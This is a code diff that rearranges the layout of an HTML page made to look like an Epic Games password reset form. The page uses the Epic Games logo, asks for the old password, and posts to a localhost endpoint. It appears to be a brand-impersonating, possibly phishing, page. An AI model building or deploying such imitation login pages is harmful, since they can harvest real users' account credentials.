@@ -179,18 +179,18 @@
 </head>
 <body>
     <div class="container">
-        <!-- Logo Section -->
-        <div class="logo">
-            <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
-        </div>
-
-        <!-- Instructions -->
-        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
-            Enter your new password for your Epic Games account.
-        </div>
-
         <!-- Form Section -->
         <div class="form-container">
+            <div class="logo">
+                <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
+            </div>
+
+            <!-- Instructions -->
+            <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
+                Enter your new password for your Epic Games account.
+            </div>
+
+            <!-- Password Reset Form -->
             <form id="password-reset-form" action="http://localhost:3000/reset-password" method="POST" onsubmit="event.preventDefault(); showLoading();">
                 <!-- Old Password Section -->
                 <div class="form-group">
